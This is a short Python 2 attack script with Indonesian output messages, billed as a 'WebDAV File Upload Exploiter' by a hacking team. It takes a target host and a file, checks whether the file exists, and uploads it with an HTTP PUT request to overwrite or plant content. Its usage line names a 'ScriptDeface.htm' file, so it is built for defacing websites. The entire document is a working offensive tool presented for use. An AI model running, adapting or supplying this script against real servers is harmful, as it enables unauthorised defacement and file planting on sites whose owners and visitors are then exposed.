#!/usr/bin/python

import requests
import string
import random
import sys
import os

os.system("clear")

print """
 _             _     ____    ___, _          , __                 _
(_|   |   |_/ | |   (|   \  /   |(_|   |_/  /|/  \               | |
  |   |   | _ | |    |    ||    |  |   |     |___/        _  _   | |
  |   |   ||/ |/ \_ _|    ||    |  |   |     |    |   |  / |/ |  |/_)
   \_/ \_/ |__/\_/ (/\___/  \__/\_/ \_/      |     \_/|_/  |  |_/| \_/

 """

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File Nama : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, Script Baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Gagal mengunggah File . . .")
    sys.exit(1)
  else:
    print("[+] File Di Unggah . . .")
    print("[+] PATH : "+host + nama)


def cekfile():
 print("""
[*] WebDAV File Upload Exploiter
[*] Coded To Python By AndroSec1337 Cyber Team
[*] Support by Qnoy0210
[*] Street Punk
""")
 print("[*] Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Di Temukan File Yg Sama Di Target . . .")
  tanya = raw_input("[!] Replace File Target ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] Exiting Tools . . .")
   sys.exit()
 else:
   print("[*] File Tidak Di Target . . .")
   print("[*] Proses Upload Script lu . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    sys.exit(0)
  else:
    cekfile()
